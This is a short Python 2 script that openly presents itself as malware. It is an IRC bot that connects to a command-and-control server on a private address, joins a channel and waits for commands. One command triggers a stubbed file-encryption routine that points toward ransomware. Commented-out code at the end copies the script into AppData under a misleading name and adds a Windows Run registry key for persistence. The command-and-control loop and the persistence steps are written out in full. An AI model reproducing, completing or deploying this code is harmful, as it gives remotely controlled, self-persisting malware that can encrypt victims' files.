# from _winreg import *
from shutil import copy

import os
import random
import socket
import sys

CHANNEL = "#FerruscaHernandez"
# SERVER = "192.168.1.74"
SERVER = "10.4.21.58"
NICKNAME = "algo"
IRC_PORT = 6667


IRC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def send(chan, msg):
    IRC.send("PRIVMSG " + chan + " " + msg + "\n")

def connect(server, channel, botnick, port):
    print "connecting to:"+server
    IRC.connect((server, port))                                                         
    IRC.send("USER " + botnick + " " + botnick +" " + botnick + " :This is a fun bot!\n")
    IRC.send("NICK " + botnick + "\n")               
    IRC.send("JOIN " + channel + "\n")        #join the chat

def get_text():
    text=IRC.recv(2040)  #receive the text

    if text.find('PING') != -1:                      
        IRC.send('PONG ' + text.split() [1] + 'r\n') 
    return text

def cifraArchivo(text):
    #cipher file
    pass

def sayMyName(channel):
    send(channel, "Me llamo malware :o")

connect(SERVER, CHANNEL, NICKNAME, IRC_PORT)

while 1:
    text = get_text()
    print text

    message = text[3:]
 
    if "PRIVMSG" in text and CHANNEL in text:
        if "!@cifraArchivo" in message:
            cifraArchivo(message)
        elif "como te llamas ?" in message:
            sayMyName(CHANNEL)
        elif "hello" in message:
            send(CHANNEL, "Hello!")



# shutil.copy(__file__, "C:\users\malware\appdata\roaming\thisIsNotMalware.py")

# # Writing Registry key
# keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
# try:
#     key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
# except:
#     key = CreateKey(HKEY_CURRENT_USER, keyVal)
# # SetValueEx(key, "JLF", 0, REG_SZ, "C:\users\malware\appdata\roaming\thisIsNotMalware.py")
# SetValueEx(key, "JLF", 0, REG_EXPAND_SZ, "C:\users\%HOMEPATH%\appdata\roaming\thisIsNotMalware.py")
# CloseKey(key)

